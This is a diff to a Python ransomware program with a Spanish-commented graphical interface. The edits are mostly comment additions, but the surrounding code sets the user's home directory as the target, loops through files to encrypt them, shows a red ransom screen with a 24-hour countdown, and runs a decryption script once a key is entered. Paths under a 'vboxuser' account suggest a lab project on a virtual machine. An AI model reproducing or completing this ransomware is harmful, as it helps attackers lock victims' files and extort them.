@@ -6,6 +6,7 @@ import customtkinter as ctk
 import subprocess
 from PIL import Image, ImageTk
 
+# Determina el directorio base de la aplicación dependiendo del modo de ejecución
 if getattr(sys, "frozen", False):
     BASE_DIR = sys._MEIPASS
 else:
@@ -13,7 +14,7 @@ else:
 
 KEY_FILE = os.path.join(BASE_DIR, "key.key")
 
-
+# Enlistados los folders que va a recorrer el programa para controlar el scope del ransomware
 home = os.path.expanduser("~")
 
 folders = [
@@ -31,7 +32,7 @@ TARGET_FOLDER = os.path.expanduser("~")
 # TARGET_FOLDER = "/home/vboxuser/Documents/archivos_importantes"
 # TARGET_FOLDER = "/home/vboxuser/Documents"
 
-
+# Ruta excluida
 EXCLUDE_ROUTE = "/home/vboxuser/Documents/ransom"
 EXCLUDE_ROUTE_2 = "/home/vboxuser/snap"
 
@@ -42,7 +43,7 @@ def load_key():
 
 
 def encrypt_file(file_path, cipher):
-    #Cifra un archivo individual
+    # Cifra un archivo individual
 
     size = os.path.getsize(file_path)
 
@@ -97,11 +98,11 @@ def encrypt_folder(folders, cipher):
             if not os.path.isfile(file_path):
                 continue
 
-            # Evitar cifrar archivos ya cifrados
+            # If para evitar cifrar archivos ya cifrados
             if file.endswith(".encrypted"):
                 continue
 
-
+            # Manejo de excepciones
             try:
 
                 encrypt_file(file_path, cipher)
@@ -112,7 +113,7 @@ def encrypt_folder(folders, cipher):
             except Exception as e:
                 print(f"Error con {file_path}: {e}")
 
-
+# Funcion para cerificar que la llave colocada en el input de la interfaz visual sea valida
 def verificar_llave():
 
     llave_ingresada = entrada_llave.get()
@@ -127,6 +128,7 @@ def verificar_llave():
                 text_color="green"
             )
 
+            # Si es valida la clave, manda a ejecutar el script para la desencriptación
             subprocess.Popen(
                 ["python3", "decrypt.py"]
             )
@@ -192,9 +194,8 @@ app.title("Mi aplicación")
 app.configure(fg_color="#b30000")
 
 
-# -------------------------------
+
 # Barra superior negra
-# -------------------------------
 
 barra_superior = ctk.CTkFrame(
     app,
@@ -242,9 +243,7 @@ texto.pack(
     padx=10
 )
 
-# -------------------------------
 # Texto central
-# -------------------------------
 
 texto_centro = ctk.CTkLabel(
     app,
@@ -259,12 +258,10 @@ texto_centro.pack(
 )
 
 
-# -------------------------------
+
 # Contador de 24 horas
-# -------------------------------
 
 segundos_restantes = 24 * 60 * 60
-
 
 contador_label = ctk.CTkLabel(
     app,
@@ -299,9 +296,8 @@ def actualizar_contador():
 
 actualizar_contador()
 
-# -------------------------------
+
 # Parte inferior
-# -------------------------------
 
 pie = ctk.CTkLabel(
     app,
@@ -337,7 +333,7 @@ boton_acceso.pack(
     pady=10
 )
 
-#Mensaje de estado
+# Mensaje de estado
 
 mensaje = ctk.CTkLabel(
     app,
